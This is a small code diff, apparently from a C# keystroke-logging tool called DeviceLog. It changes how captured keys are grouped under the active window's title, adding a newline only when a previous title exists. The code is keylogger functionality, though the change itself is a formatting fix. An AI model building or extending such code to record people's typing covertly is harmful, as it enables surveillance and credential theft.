@@ -72,11 +72,14 @@ namespace DeviceLog.Classes.Modules.Keyboard
                 string title = _windowModule.GetActiveWindowTitle();
                 if (title != null && _currentWindowTitle != title)
                 {
-                    _currentWindowTitle = title;
-
-                    _log.AddKey(Environment.NewLine);
+                    if (!string.IsNullOrEmpty(_currentWindowTitle))
+                    {
+                        _log.AddKey(Environment.NewLine);
+                    }
                     _log.AddKey("[" + title + "]");
                     _log.AddKey(Environment.NewLine);
+
+                    _currentWindowTitle = title;
                 }
             }
             _log.AddKey(key);
